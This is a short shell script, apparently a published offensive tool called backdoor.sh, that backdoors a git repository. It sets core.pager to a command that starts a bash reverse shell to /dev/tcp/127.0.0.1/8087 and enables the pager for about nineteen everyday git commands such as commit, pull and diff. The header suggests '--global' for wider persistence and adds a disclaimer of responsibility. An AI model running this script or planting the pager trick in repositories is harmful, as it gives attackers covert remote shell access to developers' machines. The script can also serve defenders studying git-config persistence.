#!/bin/sh
#
# backdoor.sh - git repo backdoor
#
# Steps:
#   1. cd into the repo you want to backdoor. 
#   2. feel free to modify this script however you want. 
#      for extra fun, add `--global` to your config commands.
#   3. Run ./backdoor.sh
#
# I am of course not responsible for any damages that result from the usage of this project.
#
# made by dayt0n (c) 2022

REVSHELL="(/bin/bash -i >& /dev/tcp/127.0.0.1/8087 0>&1 &) 2> /dev/null"
PAGER_STR="less -FRX; ${REVSHELL}"

COMMANDS=(
    "init"
    "clone"
    "status"
    "add"
    "commit"
    "rm"
    "checkout"
    "revert"
    "reset"
    "branch"
    "push"
    "merge"
    "stash"
    "pull"
    "remote"
    "switch"
    "restore"
    "diff"
    "log"
)

git config core.pager "$PAGER_STR"
for CMD in "${COMMANDS[@]}"; do
    echo "Backdooring git $CMD..."
    git config pager.$CMD true
done
